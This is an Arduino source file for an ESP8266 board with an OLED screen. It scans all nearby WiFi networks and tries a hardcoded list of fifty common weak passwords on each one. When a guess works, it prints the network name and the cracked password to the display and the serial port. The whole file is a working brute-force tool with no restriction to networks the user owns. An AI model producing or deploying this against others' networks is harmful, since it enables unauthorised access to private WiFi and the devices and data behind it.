//  CODE WITH MD.NAHIDUL SILAM
#include <ESP8266WiFi.h>
#include <Wire.h>
#include <Adafruit_GFX.h>
#include <Adafruit_SSD1306.h>

#define SCREEN_WIDTH 128
#define SCREEN_HEIGHT 64
#define OLED_RESET -1

Adafruit_SSD1306 display(SCREEN_WIDTH, SCREEN_HEIGHT, &Wire, OLED_RESET);

const char* passwords[] = {
  "12345678", "123456789", "1234567890", "0987654321", "987654321",
  "87654321", "11111111", "22222222", "66666666", "00000000",
  "11223344", "12233344", "12344321", "88997766", "14725836",
  "10293847", "19283746", "76543210", "55555555", "33333333",
  "44444444", "88888888", "10101010", "20202020", "30303030",
  "90909090", "70707070", "69696969", "78787878", "56565656",
  "23232323", "14141414", "12121212", "19191919", "17171717",
  "876543210", "88887777", "99998888", "44443333", "11110000",
  "13579135", "24682468", "19876543", "11221122", "99889988",
  "88776655", "22334455", "33445566", "44556677", "55667788"
};

void setup() {
  Serial.begin(115200);
  WiFi.mode(WIFI_STA);

  display.begin(SSD1306_SWITCHCAPVCC, 0x3C);
  display.clearDisplay();
  display.setTextColor(WHITE);
  display.setTextSize(1);

  display.setCursor(0, 0);
  display.println("📡 Scanning...");
  display.display();

  int n = WiFi.scanNetworks();
  if (n == 0) {
    Serial.println("No networks found");
    display.clearDisplay();
    display.setCursor(0, 0);
    display.println("No WiFi found.");
    display.display();
    return;
  }

  for (int i = 0; i < n; i++) {
    String ssid = WiFi.SSID(i);
    Serial.print("🔍 Trying SSID: ");
    Serial.println(ssid);
    display.clearDisplay();
    display.setCursor(0, 0);
    display.print("SSID: ");
    display.println(ssid);
    display.display();

    for (int j = 0; j < sizeof(passwords) / sizeof(passwords[0]); j++) {
      WiFi.begin(ssid.c_str(), passwords[j]);

      display.setCursor(0, 20);
      display.print("Try pass: ");
      display.println(passwords[j]);
      display.display();

      Serial.print("  🔑 Trying pass: ");
      Serial.println(passwords[j]);

      int wait_time = 0;
      while (WiFi.status() != WL_CONNECTED && wait_time < 10) {
        delay(500);
        Serial.print(".");
        wait_time++;
      }

      if (WiFi.status() == WL_CONNECTED) {
        Serial.println("\n✅ Connected!");
        Serial.print("IP: ");
        Serial.println(WiFi.localIP());

        display.clearDisplay();
        display.setCursor(0, 0);
        display.println("✅ WiFi Connected!");
        display.print("SSID: ");
        display.println(ssid);
        display.print("IP: ");
        display.println(WiFi.localIP());
        display.print("PASS: ");
        display.println(passwords[j]);  
        display.display();
        return;
      }

      WiFi.disconnect();
    }
  }

  Serial.println("❌ Couldn't connect to any WiFi.");
  display.clearDisplay();
  display.setCursor(0, 0);
  display.println("❌ No WiFi login");
  display.display();
}

void loop() {
  // Future use
}
